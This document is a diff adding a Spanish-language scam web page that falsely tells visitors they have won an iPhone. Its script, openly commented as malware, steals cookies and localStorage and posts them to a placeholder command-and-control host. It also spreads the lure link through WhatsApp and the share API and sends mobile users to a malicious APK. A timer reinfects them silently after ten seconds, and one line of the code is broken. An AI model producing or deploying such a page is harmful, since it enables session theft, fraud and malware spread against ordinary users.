@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 OFERTA EXCLUSIVA ZETA 🔥</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #0f0;
+            text-align: center;
+            padding: 50px;
+        }
+        button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #cc0000;
+        }
+    </style>
+</head>
+<body>
+    <h1>🚨 ¡FELICIDADES, GANASTE UN IPHONE 99 PRO! 🚨</h1>
+    <p>Haz clic en el botón para reclamar tu premio (¡SOLO HOY!).</p>
+    <button onclick="infect()">👉 RECLAMAR AHORA 👈</button>
+
+    <script>
+        // Función para robar datos y propagar el enlace infectado
+        function infect() {
+            alert("✅ ¡Validando tu premio! (No cierres esta ventana...)");
+
+            // Robar cookies, geolocalización, info del navegador, etc.
+            const stolenData = {
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                location: "https://ipapi.co/json/", // API para sacar IP, país, etc.
+                screen: { width: screen.width, height: screen.height },
+                localStorage: JSON.stringify(localStorage),
+            };
+
+            // Enviar datos robados al servidor C2 (¡Cambia esta URL, coño!)
+            fetch("https://tu-server-zeta.com/steal", {
+                method: "POST",
+                body: JSON.stringify(stolenData),
+                headers: { "Content-Type": "application/json" },
+            });
+
+            // Propagación: Compartir enlace infectado por WhatsApp/SMS
+            const maliciousLink = "https://zeta-premio-falso.com/infectado.html";
+            if (navigator.share) {
+                navigator.share({
+                    title: "¡MIRA ESTA OFERTA INCREÍBLE!",
+                    text: "Acabo de ganar un iPhone 99 Pro, ¡tú también puedes!",
+                    url: maliciousLink,
+                }).catch(err => console.log("¡No se pudo compartir automáticamente!"));
+            } else {
+                // Si no tiene share API, abrir WhatsApp con el enlace
+                window.open(`https://wa.me/?text=${encodeURIComponent("¡Gana un iPhone gratis aquí! " + maliciousLink)}`, "_blank");
+            }
+
+            // Auto-replicación: Si es un dispositivo móvil, descarga un APK malicioso
+            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+                window.location.href = "https://tu-server-zeta.com/ZetaVirus.apk";
+            }
+        }
+
+        // Ejecutar automáticamente si el usuario pasa 10 segundos en la página
+        setTimeout(() => {
+            if (!document.cookie.includes="zeta_infected") {
+                document.cookie = "zeta_infected=true; path=/";
+                infect(); // Infección silenciosa
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
